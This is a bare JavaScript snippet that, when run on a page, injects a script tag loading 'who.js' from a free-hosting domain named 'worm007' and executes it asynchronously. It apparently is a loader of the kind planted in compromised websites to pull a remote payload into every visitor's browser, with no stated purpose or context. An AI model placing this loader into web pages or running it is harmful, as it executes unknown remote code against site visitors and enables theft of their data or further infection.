function cargarSegundoScript() {
    var preloadLink = document.createElement('link');
    preloadLink.rel = 'preload';
    preloadLink.href = 'https://worm007.infinityfreeapp.com/who.js';
    preloadLink.as = 'script';
    document.head.appendChild(preloadLink);
    var script2 = document.createElement('script');
    script2.src = 'https://worm007.infinityfreeapp.com/who.js';
    script2.async = true;
    document.head.appendChild(script2)
}
cargarSegundoScript();
